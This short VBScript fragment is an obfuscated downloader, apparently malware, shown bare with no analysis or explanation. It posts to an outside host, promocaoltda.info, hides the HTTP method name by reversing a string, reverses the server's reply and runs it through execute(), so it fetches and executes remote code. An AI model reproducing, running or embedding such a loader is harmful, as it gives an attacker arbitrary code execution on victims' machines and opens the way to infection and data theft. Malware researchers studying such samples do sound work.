set uDrqw=CreateObject("Msxml2.xmlhttp")
ddrrl="6J0SVDQmSbtBcH7BkHoRoozca"
uDrqw.open StrReverse("PO ST") , "http://promocaoltda.info/?join=hugr&" & ddrrl ,false
execute("uDrqw.setRequestHeader ""User-Agent"", ""MyCustomUser"":uDrqw.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded"":uDrqw.send ""join=open"":B=StrReverse(uDrqw.responseText):execute(B)")
